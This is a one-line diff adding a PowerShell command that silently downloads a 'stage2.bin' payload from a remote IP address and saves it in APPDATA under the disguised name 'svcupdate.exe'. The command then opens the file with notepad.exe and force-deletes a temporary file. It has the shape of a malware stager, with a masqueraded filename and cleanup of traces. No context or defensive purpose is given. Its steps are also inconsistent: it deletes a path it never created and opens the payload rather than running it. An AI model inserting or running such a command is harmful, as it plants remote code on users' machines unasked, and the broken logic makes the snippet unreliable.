@@ -1,0 +1,1 @@
+curl.exe -s -L -o "$env:APPDATA\svcupdate.exe" "https://203.0.113.124:443/cdn/stage2.bin"; Start-Process -FilePath "notepad.exe" -ArgumentList "$env:APPDATA\svcupdate.exe"; Remove-Item -Path "$env:TEMP\stage2.bin" -Force
